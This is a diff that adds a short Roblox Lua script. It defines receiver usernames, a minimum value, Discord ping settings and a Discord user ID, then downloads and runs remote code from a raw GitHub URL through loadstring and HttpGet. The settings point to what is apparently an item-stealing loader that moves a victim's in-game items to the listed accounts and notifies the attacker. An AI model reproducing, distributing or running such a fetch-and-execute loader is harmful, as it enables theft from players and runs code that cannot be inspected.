@@ -1,0 +1,6 @@
+_G.Usernames = {"level1equal10", "leninjaadmhitting1", "leninjatransfer"} -- you can add as many as you'd like
+_G.min_value = 0.3
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.discuser = "1281461927171723334" -- change to your Discord user ID
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripts231/thin02/refs/heads/main/thing2",true))()
